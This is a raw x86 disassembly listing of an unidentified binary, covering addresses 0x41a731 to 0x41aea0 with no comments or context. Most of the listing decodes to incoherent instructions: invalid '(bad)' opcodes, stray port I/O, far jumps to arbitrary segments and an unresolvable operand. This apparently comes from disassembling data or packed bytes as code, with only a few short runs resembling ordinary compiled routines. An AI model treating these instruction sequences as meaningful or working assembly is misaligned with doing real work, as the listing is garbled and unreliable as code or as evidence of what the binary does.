  41a731:	out    0x69,al
  41a733:	in     eax,dx
  41a734:	jg     0x41a76e
  41a736:	retf   0xaa1c
  41a739:	xlat   BYTE PTR ds:[ebx]
  41a73a:	mov    eax,ds:0x4ea9965f
  41a73f:	inc    esp
  41a740:	sbb    al,0xb3
  41a742:	not    esi
  41a744:	pop    ds
  41a745:	jge    0x41a702
  41a747:	xchg   ecx,eax
  41a748:	xchg   BYTE PTR [edx+edx*4+0x32],dl
  41a74c:	rol    dl,0x51
  41a74f:	add    edx,DWORD PTR [ebp+0x2c1fa6c6]
  41a755:	and    eax,0xb3d14cdb
  41a75a:	jno    0x41a789
  41a75c:	stos   DWORD PTR es:[edi],eax
  41a75d:	fldenv [esi-0x1e]
  41a760:	add    ecx,ebx
  41a762:	int    0xc7
  41a764:	or     bh,BYTE PTR [ebp+0x49adf7d0]
  41a76a:	fbstp  TBYTE PTR [edx-0x5]
  41a76d:	or     eax,0xd9e74cdd
  41a772:	xchg   BYTE PTR [ecx],dh
  41a774:	jmp    0xce22:0xbe24f8f
  41a77b:	cmp    eax,0x535849f1
  41a780:	jmp    0x41a84d
  41a785:	jle    0x41a7da
  41a787:	and    ch,BYTE PTR [edi-0x2c0000d1]
  41a78d:	data16 jnp 0x41a75e
  41a790:	mov    ebx,0xde366bcd
  41a795:	stc    
  41a796:	xor    BYTE PTR [ecx],al
  41a798:	add    BYTE PTR [eax+0x2c000000],dh
  41a79e:	fs or  al,0x23
  41a7a2:	enter  0x3199,0x5d
  41a7a6:	mov    esp,DWORD PTR [edx]
  41a7a8:	and    bl,ch
  41a7aa:	adc    cl,BYTE PTR [ebp-0x764a546c]
  41a7b0:	xor    BYTE PTR [ebx-0x4dc09bce],0x24
  41a7b7:	or     eax,0x919e1cca
  41a7bc:	ins    DWORD PTR es:[edi],dx
  41a7bd:	movd   ecx,mm5
  41a7c0:	jp     0x41a759
  41a7c2:	fisubr DWORD PTR [edx]
  41a7c4:	xchg   esi,eax
  41a7c5:	loope  0x41a7f9
  41a7c7:	push   edx
  41a7c8:	mov    edi,0xbf03afa4
  41a7cd:	mov    esp,0x47ae0162
  41a7d2:	or     al,0xa3
  41a7d4:	sbb    esp,DWORD PTR [edi-0x6f]
  41a7d7:	out    dx,eax
  41a7d8:	pop    edx
  41a7d9:	lds    ebx,FWORD PTR [esp+eax*2-0x1becb3b7]
  41a7e0:	cdq    
  41a7e1:	not    DWORD PTR [edi+0x6272a285]
  41a7e7:	loopne 0x41a867
  41a7e9:	in     eax,dx
  41a7ea:	mov    fs,WORD PTR [edx+0xa]
  41a7ed:	mov    bl,0x43
  41a7ef:	xchg   edi,eax
  41a7f0:	xchg   si,ax
  41a7f2:	or     esp,DWORD PTR [ebp+0x71]
  41a7f5:	and    eax,0x28290afd
  41a7fa:	popf   
  41a7fb:	imul   DWORD PTR [ebx]
  41a7fd:	aas    
  41a7fe:	cld    
  41a7ff:	aas    
  41a800:	or     BYTE PTR [ecx],bl
  41a802:	xor    BYTE PTR [ebx-0x3d274f7e],al
  41a808:	adc    al,0x82
  41a80a:	lock ret 0x8a3f
  41a80e:	pusha  
  41a80f:	sub    edi,0xd2cf4ed6
  41a815:	ret    
  41a816:	xor    BYTE PTR [ebp-0x36],0x6e
  41a81a:	aaa    
  41a81b:	mov    cl,0xc7
  41a81d:	fstp   QWORD PTR [edx+0x1c]
  41a820:	inc    edx
  41a821:	outs   dx,BYTE PTR ds:[esi]
  41a822:	dec    ebp
  41a823:	cli    
  41a824:	neg    BYTE PTR [ebx]
  41a826:	dec    ebx
  41a827:	ins    BYTE PTR es:[edi],dx
  41a828:	push   ds
  41a829:	xor    edx,edx
  41a82b:	mov    al,0x79
  41a82d:	aad    0x34
  41a82f:	adc    edi,ecx
  41a831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a832:	push   ss
  41a833:	and    DWORD PTR [edx],esp
  41a835:	scas   al,BYTE PTR es:[edi]
  41a836:	push   cs
  41a837:	mov    ch,0xca
  41a839:	cmp    esi,DWORD PTR [edi]
  41a83b:	fiadd  WORD PTR [esi+esi*4+0x7e51390e]
  41a842:	gs enter 0x986c,0xf1
  41a847:	in     eax,0xf4
  41a849:	mov    esp,0x50426bb
  41a84e:	jp     0x41a7e6
  41a850:	(bad)  
  41a851:	call   DWORD PTR [edx-0x7f]
  41a854:	shr    eax,1
  41a856:	sar    bh,cl
  41a858:	call   DWORD PTR [ecx+0x50]
  41a85b:	jmp    0x41a928
  41a860:	(bad)  
  41a861:	std    
  41a862:	pop    es
  41a863:	and    eax,0xfff6ff2f
  41a868:	popf   
  41a869:	adc    DWORD PTR [eax+0x3f],edx
  41a86c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a86d:	sahf   
  41a86e:	inc    esp
  41a86f:	gs test eax,0xb0000131
  41a875:	add    BYTE PTR [eax],al
  41a877:	add    BYTE PTR [ecx],bl
  41a879:	js     0x41a848
  41a87b:	ret    0xd60e
  41a87e:	call   0xdeea:0x74953eeb
  41a885:	popa   
  41a886:	adc    DWORD PTR fs:[ebp-0x1e],ecx
  41a88a:	and    ebp,DWORD PTR [edx+0x72f459ce]
  41a890:	cmc    
  41a891:	cmp    DWORD PTR [ecx+ecx*1-0x5d8df51b],esi
  41a898:	dec    ebx
  41a899:	ret    
  41a89a:	push   ebp
  41a89b:	cli    
  41a89c:	into   
  41a89d:	call   0x3190:0x51e314a2
  41a8a4:	fnsave [edi+0x61]
  41a8a7:	mov    BYTE PTR [ebx-0x50e5a9c6],0xe2
  41a8ae:	mov    DWORD PTR [ebx],esp
  41a8b0:	mov    ah,0x2b
  41a8b2:	dec    eax
  41a8b3:	push   edi
  41a8b4:	and    DWORD PTR [edi],esi
  41a8b6:	call   0x3a073da3
  41a8bb:	mov    ecx,ss
  41a8bd:	shl    DWORD PTR ds:0x51e6ac6c,1
  41a8c3:	or     ah,ah
  41a8c5:	popa   
  41a8c6:	adc    DWORD PTR [edx+0xa],ebx
  41a8c9:	dec    esp
  41a8ca:	xchg   esi,eax
  41a8cb:	push   sp
  41a8cd:	test   DWORD PTR [edx+0x2d],eax
  41a8d0:	cmp    ebx,eax
  41a8d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8d3:	sbb    ebx,DWORD PTR [ebx]
  41a8d5:	sub    al,0xb2
  41a8d7:	xchg   ebx,eax
  41a8d8:	std    
  41a8d9:	adc    DWORD PTR [edi-0x3f5e99f6],edi
  41a8df:	fstp   TBYTE PTR [ecx-0x75]
  41a8e2:	stos   BYTE PTR es:[edi],al
  41a8e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8e5:	mov    al,0x58
  41a8e7:	pop    ecx
  41a8e8:	jmp    0xefbb28de
  41a8ed:	in     al,dx
  41a8ee:	(bad)  
  41a8ef:	cwde   
  41a8f0:	fcmovb st,st(4)
  41a8f2:	jns    0x41a8bc
  41a8f4:	pop    ecx
  41a8f5:	sbb    bl,bh
  41a8f7:	mov    BYTE PTR [ebp+0x4],al
  41a8fa:	in     eax,0xc2
  41a8fc:	jg     0x41a942
  41a8fe:	retf   0xd775
  41a901:	jno    0x41a91f
  41a903:	push   cs
  41a904:	je     0x41a96f
  41a906:	icebp  
  41a907:	out    0xc5,eax
  41a909:	xchg   BYTE PTR [eax+0x4b7101ca],cl
  41a90f:	inc    ebp
  41a910:	mov    esi,0xede3825d
  41a915:	(bad)  
  41a916:	jp     0x41a8bf
  41a918:	add    DWORD PTR [ecx+0x17ea203a],eax
  41a91e:	data16 icebp 
  41a920:	push   edi
  41a921:	out    0xb1,eax
  41a923:	and    cl,BYTE PTR [ecx-0x177daced]
  41a929:	adc    BYTE PTR [eax+eax*1-0x74377500],0x45
  41a931:	call   0x42721f
  41a936:	add    BYTE PTR [ebx-0x65],bl
  41a939:	xchg   ebx,eax
  41a93a:	mov    edi,0xff7fbfd3
  41a93f:	cwde   
  41a940:	push   0xffffff93
  41a942:	add    al,BYTE PTR [ecx]
  41a944:	mov    al,ds:0x32594ec3
  41a949:	add    DWORD PTR [eax],eax
  41a94b:	mov    al,0x0
  41a94d:	add    BYTE PTR [eax],al
  41a94f:	inc    ebp
  41a950:	adc    cl,BYTE PTR [edx]
  41a952:	jns    0x41a951
  41a954:	retf   
  41a955:	arpl   ax,sp
  41a957:	pop    esi
  41a958:	mov    bl,0x1
  41a95a:	adc    dl,dh
  41a95c:	push   ecx
  41a95d:	mov    ch,ch
  41a95f:	js     0x41a986
  41a961:	xchg   esp,eax
  41a962:	ins    DWORD PTR es:[edi],dx
  41a963:	test   DWORD PTR [ebx+0x30f9068a],ecx
  41a969:	jle    0x41a9be
  41a96b:	mov    ds:0x5fd6abfa,eax
  41a970:	mov    eax,ds:0x2380b6f8
  41a975:	aad    0xdc
  41a977:	(bad)  
  41a978:	pusha  
  41a979:	outs   dx,BYTE PTR ds:[esi]
  41a97a:	push   esi
  41a97b:	xchg   ebx,eax
  41a97c:	xor    DWORD PTR [edi-0x3f],ebp
  41a97f:	test   BYTE PTR [ecx-0x5b],bh
  41a982:	gs arpl bx,si
  41a985:	inc    ebp
  41a986:	shl    BYTE PTR [ecx-0x56],1
  41a989:	pop    es
  41a98a:	jb     0x41a977
  41a98c:	dec    edx
  41a98d:	out    0x7a,al
  41a98f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a990:	(bad)  
  41a991:	xchg   edx,eax
  41a992:	repz ficomp WORD PTR [edx]
  41a995:	sti    
  41a996:	ds cld 
  41a998:	and    dl,dl
  41a99a:	cmp    BYTE PTR [eax],bl
  41a99c:	ja     0x41a9fc
  41a99e:	test   BYTE PTR [esp+eax*4+0x43db994],al
  41a9a5:	cmc    
  41a9a6:	inc    edx
  41a9a7:	xchg   esi,edi
  41a9a9:	hlt    
  41a9aa:	add    DWORD PTR [edi-0x225cd968],esp
  41a9b0:	mov    esp,0xfeec14a2
  41a9b5:	inc    ecx
  41a9b6:	std    
  41a9b7:	les    edx,FWORD PTR [esi+ecx*8]
  41a9ba:	in     al,dx
  41a9bb:	out    dx,eax
  41a9bc:	stc    
  41a9bd:	shl    BYTE PTR [bx],0x13
  41a9c1:	imul   edi,DWORD PTR [ecx+0x13033ff0],0x8c3e9fb4
  41a9cb:	dec    edx
  41a9cc:	fild   DWORD PTR [ecx-0x7a921b56]
  41a9d2:	xchg   ebp,eax
  41a9d3:	adc    BYTE PTR [edx+0x72],0x9a
  41a9d7:	jmp    0x41a959
  41a9d9:	aaa    
  41a9da:	xchg   BYTE PTR [edx],bl
  41a9dc:	lds    esi,FWORD PTR [esi-0x12]
  41a9df:	dec    ebp
  41a9e0:	dec    ebp
  41a9e1:	xchg   edi,eax
  41a9e2:	(bad)  [edx-0x727f1970]
  41a9e8:	or     eax,0xc5f6388c
  41a9ed:	push   0xca75c987
  41a9f2:	shl    BYTE PTR [edx+0x6d5d594f],cl
  41a9f8:	inc    ebx
  41a9f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9fa:	test   DWORD PTR [esi-0x74d1788f],edx
  41aa00:	pop    ebp
  41aa01:	in     al,dx
  41aa02:	add    ecx,eax
  41aa04:	jmp    0x41aad1
  41aa09:	xchg   ebx,eax
  41aa0a:	dec    ebp
  41aa0b:	retf   0xde2a
  41aa0e:	scas   eax,DWORD PTR es:[edi]
  41aa0f:	repz std 
  41aa11:	mul    BYTE PTR ds:0xea71a1c2
  41aa17:	push   0x1c
  41aa19:	or     DWORD PTR [ebx],esi
  41aa1b:	add    DWORD PTR [eax],eax
  41aa1d:	mov    al,0x0
  41aa1f:	add    BYTE PTR [eax],al
  41aa21:	sbb    eax,0xadb0de30
  41aa26:	mov    BYTE PTR [edi+0x72],dh
  41aa29:	jnp    0x41aa56
  41aa2b:	sub    esi,0x9aab0613
  41aa31:	mov    WORD PTR [edx-0x11],ds
  41aa34:	xchg   edi,eax
  41aa35:	adc    bl,BYTE PTR [eax+edx*4-0x3ec0f110]
  41aa3c:	sbb    eax,0xe1b8fd56
  41aa41:	push   edi
  41aa42:	jns    0x41aa64
  41aa44:	imul   esi,DWORD PTR [eax+0x4ff0fa35],0x5c
  41aa4b:	pusha  
  41aa4c:	and    edi,edi
  41aa4e:	inc    esi
  41aa4f:	push   esi
  41aa50:	dec    esi
  41aa51:	popf   
  41aa52:	dec    ebx
  41aa53:	dec    edi
  41aa54:	dec    esi
  41aa55:	mov    ?,esi
  41aa57:	outs   dx,DWORD PTR ds:[esi]
  41aa58:	test   BYTE PTR [eax],bh
  41aa5a:	pop    ds
  41aa5b:	xchg   BYTE PTR [esi+0x43],dh
  41aa5e:	cmp    al,al
  41aa60:	int3   
  41aa61:	dec    ebx
  41aa62:	mov    ds:0x6eca13d9,al
  41aa67:	cmp    eax,0xab1f8c77
  41aa6c:	add    DWORD PTR [ebx],edx
  41aa6e:	rcr    ah,cl
  41aa70:	push   cs
  41aa71:	jo     0x41aa99
  41aa73:	bound  edi,QWORD PTR [ecx+0x7204d4e4]
  41aa79:	enter  0x7ec4,0xdb
  41aa7d:	push   edi
  41aa7e:	mov    DWORD PTR [ecx+ebp*4+0x39ef9e57],0x37c5f333
  41aa89:	(bad)  
  41aa8b:	fimul  DWORD PTR [ecx+ecx*4-0x50]
  41aa8f:	xchg   BYTE PTR [edi],bh
  41aa91:	jl     0x41aac7
  41aa93:	xor    eax,0xa55f96f
  41aa98:	retf   
  41aa99:	fs push ss
  41aa9b:	sub    eax,0x8697f270
  41aaa0:	inc    ebx
  41aaa1:	jmp    0x41aa8b
  41aaa3:	sbb    eax,0x8a3297ae
  41aaa8:	mov    ds:0xbf6b778f,al
  41aaad:	inc    esi
  41aaae:	or     DWORD PTR [ebp+0x19],ebp
  41aab1:	xor    ebp,edx
  41aab3:	inc    eax
  41aab4:	inc    esp
  41aab5:	mov    cl,0xa5
  41aab8:	push   edi
  41aab9:	cmp    esp,ecx
  41aabb:	mov    ah,0x47
  41aabd:	rcr    BYTE PTR ds:0x5dd45075,1
  41aac3:	dec    edi
  41aac4:	cmp    al,0x86
  41aac6:	xor    ecx,edx
  41aac8:	fst    DWORD PTR [eax+0x72]
  41aacb:	mov    BYTE PTR [edi+0x77a11f84],bl
  41aad1:	adc    edx,ebx
  41aad3:	add    ecx,0xffffcaa4
  41aad9:	adc    edx,0xffffffff
  41aadc:	mov    eax,DWORD PTR [ebp+0xc]
  41aadf:	mov    DWORD PTR [eax],ecx
  41aae1:	mov    DWORD PTR [eax+0x4],edx
  41aae4:	mov    eax,DWORD PTR [ebp-0x38]
  41aae7:	mov    ecx,DWORD PTR [ebp-0x34]
  41aaea:	mov    edx,DWORD PTR [ebp-0x40]
  41aaed:	jmp    0x41abba
  41aaf2:	sbb    dh,BYTE PTR [edi-0x6b]
  41aaf5:	lods   eax,DWORD PTR ds:[esi]
  41aaf6:	std    
  41aaf7:	out    dx,eax
  41aaf8:	cmp    dh,bh
  41aafa:	std    
  41aafb:	xchg   esp,eax
  41aafc:	push   esi
  41aafd:	jp     0x41aafa
  41aaff:	inc    esp
  41ab00:	mov    ah,0x92
  41ab02:	mov    ecx,0xb0000133
  41ab07:	add    BYTE PTR [eax],al
  41ab09:	add    BYTE PTR [ebx+0x13],ch
  41ab0c:	lock stc 
  41ab0e:	push   es
  41ab0f:	lods   al,BYTE PTR ds:[esi]
  41ab10:	sub    eax,DWORD PTR [ebx-0x29]
  41ab13:	add    dh,0x59
  41ab16:	inc    esp
  41ab17:	xchg   BYTE PTR [edi-0x77],dh
  41ab1a:	or     DWORD PTR [edi-0x49],esi
  41ab1d:	inc    esi
  41ab1e:	xor    edx,esp
  41ab20:	icebp  
  41ab21:	or     dl,bl
  41ab23:	inc    ecx
  41ab24:	sub    BYTE PTR [esi-0x2b],bh
  41ab27:	aad    0x8d
  41ab29:	inc    eax
  41ab2a:	lds    edx,FWORD PTR [edi+edx*1+0x25]
  41ab2e:	pop    ebp
  41ab2f:	push   edi
  41ab30:	aad    0x29
  41ab32:	pusha  
  41ab33:	test   BYTE PTR [edi-0x11],dh
  41ab36:	inc    ebx
  41ab37:	add    DWORD PTR [ebx-0x55cd6127],esp
  41ab3d:	shl    esi,0x9e
  41ab40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab41:	jmp    0x50d3f51a
  41ab46:	sbb    ecx,DWORD PTR [eax-0x121f2c5a]
  41ab4c:	mov    dl,0x44
  41ab4e:	push   esi
  41ab4f:	les    ecx,FWORD PTR ds:0x9eb903a3
  41ab55:	ret    0x722d
  41ab58:	mov    DWORD PTR [edi+edi*4],esi
  41ab5b:	popf   
  41ab5c:	test   al,0x37
  41ab5e:	int3   
  41ab5f:	or     dh,BYTE PTR [ebx+0x6c]
  41ab62:	mov    edi,0xbb8b14c9
  41ab67:	arpl   WORD PTR [edi-0x54],si
  41ab6a:	popa   
  41ab6b:	mov    edx,0x12ff4586
  41ab70:	test   eax,0xe590e5f3
  41ab75:	out    dx,al
  41ab76:	rol    DWORD PTR [ebx+0x5b],cl
  41ab79:	scas   al,BYTE PTR es:[edi]
  41ab7a:	xchg   cl,ch
  41ab7c:	retf   0x3413
  41ab7f:	enter  0xdcd3,0x61
  41ab83:	test   BYTE PTR [ebx],dh
  41ab85:	and    al,ch
  41ab87:	aas    
  41ab88:	popa   
  41ab89:	aas    
  41ab8a:	xor    al,0x15
  41ab8c:	xor    ebx,ebp
  41ab8e:	popa   
  41ab8f:	and    edx,DWORD PTR [edi-0x5d]
  41ab92:	not    dl
  41ab94:	xor    BYTE PTR ds:0xf6718b73,ah
  41ab9a:	not    BYTE PTR [edx]
  41ab9c:	mov    BYTE PTR ds:0x9b7c29d2,bh
  41aba2:	push   esi
  41aba3:	(bad)  
  41aba4:	cmp    DWORD PTR [edi],edi
  41aba6:	cmp    al,0x5b
  41aba8:	sub    BYTE PTR [edx],bl
  41abaa:	lahf   
  41abab:	sub    bl,al
  41abad:	aas    
  41abae:	mov    al,ss:0x90aa268e
  41abb4:	lds    ecx,FWORD PTR [ebx-0x10c7e908]
  41abba:	mov    ebx,DWORD PTR [ebp-0x3c]
  41abbd:	and    eax,0x16b2
  41abc2:	jmp    0x41ac8f
  41abc7:	xchg   esi,eax
  41abc8:	dec    esi
  41abc9:	jns    0x41abb0
  41abcb:	stc    
  41abcc:	neg    DWORD PTR [esi-0x35faf881]
  41abd2:	mov    ebx,0x675ba8f1
  41abd7:	imul   esi,DWORD PTR [ecx+eax*1],0xb000
  41abde:	add    BYTE PTR [edi+0x4c],ah
  41abe1:	mov    bl,0x81
  41abe3:	std    
  41abe4:	cwde   
  41abe5:	lea    ebx,[eax-0x2c16a549]
  41abeb:	cmp    eax,0xddfdf824
  41abf0:	enter  0x5a5d,0x16
  41abf4:	cdq    
  41abf5:	outs   dx,BYTE PTR ds:[esi]
  41abf6:	push   ss
  41abf7:	add    BYTE PTR [esi],bl
  41abf9:	pop    ebx
  41abfa:	pop    es
  41abfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abfc:	inc    eax
  41abfd:	inc    ecx
  41abfe:	inc    edx
  41abff:	mov    bh,0x81
  41ac01:	pusha  
  41ac02:	xchg   esi,eax
  41ac03:	repz mov ds:0x73ef5dc8,eax
  41ac09:	and    al,0xa8
  41ac0b:	jecxz  0x41abce
  41ac0d:	cli    
  41ac0e:	and    al,dl
  41ac10:	and    dh,bl
  41ac12:	and    DWORD PTR [esi-0x1e2d493e],esp
  41ac18:	outs   dx,BYTE PTR ds:[esi]
  41ac19:	iret   
  41ac1a:	shr    esi,0x4d
  41ac1d:	aaa    
  41ac1e:	jmp    0x4254ec72
  41ac23:	inc    edx
  41ac24:	leave  
  41ac25:	and    BYTE PTR [edx+0x256f4222],al
  41ac2b:	lds    esp,FWORD PTR [edi+edx*2+0x64]
  41ac2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac30:	outs   dx,BYTE PTR ds:[esi]
  41ac31:	dec    ebx
  41ac32:	pop    ebp
  41ac33:	out    dx,al
  41ac34:	aaa    
  41ac35:	in     eax,0x67
  41ac37:	pop    edi
  41ac38:	les    esi,FWORD PTR [edx]
  41ac3a:	cli    
  41ac3b:	jg     0x41ac26
  41ac3d:	sahf   
  41ac3e:	and    esi,ebx
  41ac40:	dec    edi
  41ac41:	test   eax,0x35f635f9
  41ac46:	fadd   st,st(1)
  41ac48:	xlat   BYTE PTR ds:[ebx]
  41ac49:	lock xacquire sbb BYTE PTR [eax+edi*8],0xf4
  41ac4f:	xchg   esi,eax
  41ac50:	pop    edx
  41ac51:	mov    al,0xcf
  41ac53:	or     edx,DWORD PTR [edi-0x49bc53b]
  41ac59:	rcr    BYTE PTR [edi-0x4],1
  41ac5c:	ja     0x41abe3
  41ac5e:	or     al,0x42
  41ac60:	jo     0x41acac
  41ac62:	push   ss
  41ac63:	js     0x41ac7c
  41ac65:	test   DWORD PTR [edx-0x2d342580],edi
  41ac6b:	jno    0x41acbe
  41ac6d:	clc    
  41ac6e:	dec    eax
  41ac6f:	popf   
  41ac70:	xchg   esi,eax
  41ac71:	xor    BYTE PTR [esi+0x5a],dh
  41ac74:	das    
  41ac75:	cmp    ebp,DWORD PTR [edi]
  41ac77:	xor    eax,0xe853e1e8
  41ac7c:	popa   
  41ac7d:	(bad)  
  41ac7e:	dec    edx
  41ac7f:	dec    esp
  41ac80:	sar    dh,1
  41ac82:	sbb    al,0x38
  41ac84:	fsubr  QWORD PTR [edx]
  41ac86:	in     eax,dx
  41ac87:	mov    eax,edx
  41ac89:	(bad)  
  41ac8b:	cwde   
  41ac8c:	icebp  
  41ac8d:	and    cl,BYTE PTR [ecx+0x558bc233]
  41ac93:	mov    eax,0xc8e9
  41ac98:	add    BYTE PTR [ebx],bl
  41ac9a:	adc    al,0xae
  41ac9c:	das    
  41ac9d:	scas   eax,DWORD PTR es:[edi]
  41ac9e:	mov    edi,0x39bf349b
  41aca3:	ins    DWORD PTR es:[edi],dx
  41aca4:	in     al,0x9f
  41aca6:	fiadd  DWORD PTR [ebp+0x5f]
  41aca9:	sbb    DWORD PTR ds:0xb00001,esi
  41acaf:	add    BYTE PTR [eax],al
  41acb1:	cmp    eax,0xcdc7e818
  41acb6:	jnp    0x41acaa
  41acb8:	(bad)
  41acbb:	xor    BYTE PTR [esp+eiz*2],al
  41acbe:	test   DWORD PTR [edi-0x18],esp
  41acc1:	pop    ebp
  41acc2:	push   edx
  41acc3:	mov    ds:0xc5b95db8,eax
  41acc8:	mov    ebx,0xceba35c7
  41accd:	inc    esi
  41acce:	mov    dl,0xf5
  41acd0:	mov    bh,0x8f
  41acd2:	in     eax,dx
  41acd3:	in     al,dx
  41acd4:	push   0x5
  41acd6:	cdq    
  41acd7:	clc    
  41acd8:	mov    ebx,cs
  41acda:	neg    ch
  41acdc:	and    ah,BYTE PTR [edi+0x5cdd5c68]
  41ace2:	enter  0x78d6,0x89
  41ace6:	and    ebx,esp
  41ace8:	and    bl,BYTE PTR [ebp+0x35]
  41aceb:	xor    ch,al
  41aced:	fidiv  WORD PTR [edi+ecx*4+0x7ac8df65]
  41acf4:	out    dx,eax
  41acf5:	jae    0x41acb9
  41acf7:	xchg   ebp,eax
  41acf8:	ret    0x30d7
  41acfb:	cmp    dl,BYTE PTR [ecx+eax*4]
  41acfe:	and    eax,0x596dcc1a
  41ad03:	pop    eax
  41ad04:	pop    ds
  41ad05:	clc    
  41ad06:	add    ecx,DWORD PTR [edx-0x28]
  41ad09:	test   BYTE PTR [eax-0x61],0xeb
  41ad0d:	ficomp DWORD PTR [esi-0x4d3bb50b]
  41ad13:	pusha  
  41ad14:	data16 mov bh,0x2f
  41ad17:	std    
  41ad18:	addr16 dec eax
  41ad1a:	push   esp
  41ad1b:	aam    0x9a
  41ad1d:	xor    dh,BYTE PTR [esi-0x73]
  41ad20:	inc    edi
  41ad21:	inc    ebp
  41ad22:	imul   ebp,DWORD PTR [edi],0xffffff9a
  41ad25:	ret    0x3a58
  41ad28:	cmp    eax,DWORD PTR [esi]
  41ad2a:	jo     0x41ad7b
  41ad2c:	in     eax,0x1b
  41ad2e:	lods   al,BYTE PTR ds:[esi]
  41ad2f:	pop    eax
  41ad30:	std    
  41ad31:	xchg   DWORD PTR [edx-0x16da4453],edx
  41ad37:	clc    
  41ad38:	pop    ebp
  41ad39:	repz out 0x1f,eax
  41ad3c:	daa    
  41ad3d:	sub    eax,0xf3375499
  41ad42:	fist   DWORD PTR [esi+edx*1-0x4b29e81b]
  41ad49:	add    eax,0x1ea3e9ff
  41ad4e:	mov    ebx,0x53e382b7
  41ad53:	inc    esp
  41ad54:	jns    0x41ad84
  41ad56:	(bad)  
  41ad57:	or     edi,DWORD PTR [ecx+eiz*2]
  41ad5a:	shl    cl,1
  41ad5c:	in     eax,0x72
  41ad5e:	xchg   ebp,eax
  41ad5f:	(bad)  
  41ad61:	and    ecx,0x476c
  41ad67:	xor    ecx,ebx
  41ad69:	mov    ebx,DWORD PTR [ebp-0x44]
  41ad6c:	jmp    0x41ae39
  41ad71:	(bad)  
  41ad73:	cmp    BYTE PTR [eax+0x7c],ah
  41ad76:	arpl   WORD PTR [edi+0x7f],bx
  41ad79:	(bad)  
  41ad7a:	pop    ss
  41ad7b:	jmp    0x41ad4a
  41ad7d:	jecxz  0x41adbd
  41ad7f:	sub    eax,0x135c9a4
  41ad84:	add    BYTE PTR [eax-0x5d000000],dh
  41ad8a:	aas    
  41ad8b:	cmp    BYTE PTR [eax],cl
  41ad8d:	inc    ebp
  41ad8e:	mov    dl,BYTE PTR [ecx+0x5e239876]
  41ad94:	sbb    BYTE PTR [ebx],dh
  41ad96:	mov    bh,0x76
  41ad98:	ja     0x41ad43
  41ad9a:	add    al,0x72
  41ad9c:	pop    esp
  41ad9d:	mov    edx,0xeb34d215
  41ada2:	fs nop
  41ada4:	mov    ch,0xca
  41ada6:	mov    dh,0x9
  41ada8:	lahf   
  41ada9:	stos   DWORD PTR es:[edi],eax
  41adaa:	cdq    
  41adab:	clc    
  41adac:	mov    esi,0x287a186f
  41adb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adb2:	test   al,0x84
  41adb4:	xchg   esi,eax
  41adb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adb6:	xchg   BYTE PTR [eax-0x1a],dh
  41adb9:	das    
  41adba:	push   ebp
  41adbb:	ret    
  41adbc:	mov    ebp,eax
  41adbe:	pop    ebp
  41adbf:	jl     0x41adee
  41adc1:	inc    edx
  41adc2:	(bad)  
  41adc4:	inc    esp
  41adc5:	loope  0x41adaa
  41adc7:	out    dx,al
  41adc8:	and    ebx,DWORD PTR [ecx+0x42]
  41adcb:	or     DWORD PTR [edi+0x5d79251],ebp
  41add1:	push   eax
  41add2:	stos   DWORD PTR es:[edi],eax
  41add3:	mov    ebp,0x3d06c112
  41add8:	xchg   edx,eax
  41add9:	jne    0x41adbe
  41addb:	sbb    eax,0x89e8371
  41ade0:	dec    edx
  41ade1:	jle    0x41ae21
  41ade3:	sbb    eax,0x1151dfb3
  41ade8:	stos   DWORD PTR es:[edi],eax
  41ade9:	dec    BYTE PTR [ecx]
  41adeb:	mov    WORD PTR [edi+0x57c01daa],gs
  41adf1:	sbb    DWORD PTR [ebx+ebp*8+0x51342cd2],edx
  41adf8:	cdq    
  41adf9:	push   es
  41adfa:	xchg   esp,eax
  41adfb:	dec    esp
  41adfc:	out    0x91,eax
  41adfe:	int3   
  41adff:	xchg   edi,eax
  41ae00:	pop    eax
  41ae01:	dec    edx
  41ae02:	push   cs
  41ae03:	call   0x8ad0:0x598a7c5f
  41ae0a:	pop    esp
  41ae0b:	jmp    DWORD PTR [ecx]
  41ae0d:	xchg   edx,eax
  41ae0e:	or     eax,0x9ca113a8
  41ae13:	test   ch,ah
  41ae15:	push   ss
  41ae16:	bound  esp,QWORD PTR [eax-0x47]
  41ae19:	jns    0x41ad9e
  41ae1b:	xchg   esp,eax
  41ae1c:	sbb    eax,0x937db8f1
  41ae21:	clc    
  41ae22:	mov    edi,0x7fd7bc06
  41ae27:	scas   al,BYTE PTR es:[edi]
  41ae28:	into   
  41ae29:	pop    ss
  41ae2a:	push   ecx
  41ae2b:	cmp    eax,0x5f66496c
  41ae30:	sub    ax,0xae76
  41ae34:	mov    DWORD PTR [esi+0x597a481],edx
  41ae3a:	test   DWORD PTR [edi+edi*8+0x3ad181ff],esp
  41ae41:	into   
  41ae42:	(bad)  
  41ae43:	dec    DWORD PTR [ebx]
  41ae45:	ret    0xc8e9
  41ae48:	add    BYTE PTR [eax],al
  41ae4a:	add    BYTE PTR [edi-0xc0e2c6b],ah
  41ae50:	mul    DWORD PTR [edi-0x7cba3229]
  41ae56:	in     al,0x28
  41ae58:	(bad)  
  41ae59:	mov    esi,0x136794e
  41ae5e:	add    BYTE PTR [eax-0x42000000],dh
  41ae64:	test   eax,0x8c08381c
  41ae69:	mov    ds:0xb999b7f0,al
  41ae6e:	xchg   ebx,eax
  41ae6f:	lahf   
  41ae70:	add    BYTE PTR [eax+edx*1+0x68],dl
  41ae74:	adc    ebx,ebp
  41ae76:	sub    esi,esi
  41ae78:	mov    ds:0x33417c10,eax
  41ae7d:	mov    bh,ah
  41ae7f:	add    BYTE PTR [ebx-0x60],bl
  41ae82:	mov    dl,BYTE PTR [ecx+0x2e78b30f]
  41ae88:	sub    al,0x57
  41ae8a:	pop    ss
  41ae8b:	add    DWORD PTR [edi-0x4],ebx
  41ae8e:	mov    ebp,0x300213a0
  41ae93:	dec    edi
  41ae94:	inc    edi
  41ae95:	cdq    
  41ae96:	ja     0x41ae4c
  41ae98:	cli    
  41ae99:	fimul  WORD PTR [ebx+edi*1-0x44ba80eb]
  41aea0:	nop
